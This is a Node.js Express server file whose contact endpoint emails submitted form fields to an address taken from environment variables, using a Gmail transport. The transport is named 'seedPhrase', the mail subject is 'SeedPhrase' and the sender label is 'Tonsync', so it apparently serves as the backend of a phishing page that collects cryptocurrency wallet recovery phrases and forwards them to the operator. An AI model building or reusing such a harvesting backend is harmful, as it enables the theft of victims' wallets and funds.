const path = require("path");
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");

require("dotenv").config();

const PORT = process.env.PORT || 3001

const app = express();
app.use(express.static(path.resolve(__dirname, "../build")));
app.use(cors())
app.use(bodyParser.json());


app.get("/api", (req, res) => {
    res.json({ message: "Hello from server"})
})

const seedPhrase = nodemailer.createTransport({
    service:"gmail",
    auth: {
        user: process.env.EMAIL_ADDRESS,
        pass: process.env.EMAIL_PASS
    }
}) 
seedPhrase.verify(error => {
    if(error) {
        console.log(error)
    }else {
        console.log("it ready to send")
    }
})

app.post("/api/contact", bodyParser.urlencoded({ extended:false}), (req, res) => {
    const name = req.body.firstName + ` ` + req.body.lastName;
    const phonenumber = req.body.phone;
    const email = req.body.email;
    const message = req.body.message;
    const mail = {
        form: "Tonsync",
        to: process.env.EMAIL_ADDRESS,
        subject: "SeedPhrase",
        html: `
        <p>Name: ${name}</p>
        <p>Email: ${email}</p>
        <p>Phone: ${phonenumber}</p>
        <p>Message: ${message}</p>
       
        `
    }
    seedPhrase.sendMail(mail, error => {
        if(error) {
            res.json(error)
        }else {
            res.json({ code: 200, status:"it ready to send"})
        }
    });
})
app.get("*", (req, res) => {
    res.sendFile(path.resolve(__dirname, "../build", "index.html"));
})
app.listen(PORT, () => {
    console.log(`server is live on PORT:${PORT}`)
})